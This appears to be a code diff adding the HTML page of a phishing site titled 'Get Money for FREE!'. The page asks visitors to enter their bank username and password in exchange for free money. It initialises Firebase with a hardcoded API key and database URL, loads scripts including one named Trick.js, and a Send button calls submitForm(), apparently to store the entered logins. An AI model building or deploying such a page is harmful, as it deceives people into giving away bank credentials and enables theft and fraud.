@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="icon" href="icon/ico.png">
+        <title>Get Money for FREE!</title>
+        <script src="p5.js"></script>
+        <script src="p5.play.js"></script>
+        <script src="https://www.gstatic.com/firebasejs/6.3.4/firebase-app.js"></script>
+        <script src="https://www.gstatic.com/firebasejs/6.3.0/firebase-database.js"></script>
+        <script>
+            var firebaseConfig = {
+                apiKey: "AIzaSyBFjHbbtWcQN2lOvahwgiJ7pQae6rI_SME",
+                authDomain: "form-35604.firebaseapp.com",
+                databaseURL: "https://form-35604-default-rtdb.firebaseio.com",
+                projectId: "form-35604",
+                storageBucket: "form-35604.appspot.com",
+                messagingSenderId: "863211251084",
+                appId: "1:863211251084:web:5ab14281187babcefe62a9"
+  };
+  firebase.initializeApp(firebaseConfig);
+        </script>
+        <script src="js/Form.js"></script>
+        <script src="js/User.js"></script>
+        <script src="js/Trick.js"></script>
+        <link rel="stylesheet" href="style.css">
+    </head>
+    <body>
+        <h1 id="title">Put your bank credit username and password </br></br>to obtain incredible amounts of money, for FREE!</h1>
+            <p id="username_Prompt">Username:</p>
+            <input type="text" id="username_Input"></input>
+            <p id="username_Password">Password:</p>
+            <input type="password" id="password_Input"></input>
+            <a href="extra.html">
+            <button onclick="submitForm()" id="submit_button">Send</button>
+            </a>
+
+        <script src="script.js"></script>
+    </body>
+</html>
